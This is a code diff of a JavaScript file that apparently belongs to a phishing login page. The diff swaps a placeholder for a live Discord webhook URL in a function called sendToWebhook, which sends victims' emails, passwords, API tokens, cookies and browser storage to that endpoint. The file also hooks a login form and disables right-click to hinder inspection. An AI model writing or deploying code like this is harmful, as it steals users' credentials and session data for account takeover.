@@ -110,7 +110,7 @@ function simulateFetchAccountToken(email, password) {
 
 // Real Webhook (requires server)
 async function sendToWebhook(email, password, tokenData) {
-  const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // Replace with webhook.site URL
+  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with webhook.site URL
   const { apiToken, userTokens } = tokenData || {
     apiToken: null,
     userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} }
@@ -200,3 +200,4 @@ if (loginForm && loginButton) {
 document.addEventListener("contextmenu", (e) => {
   e.preventDefault();
 });
+
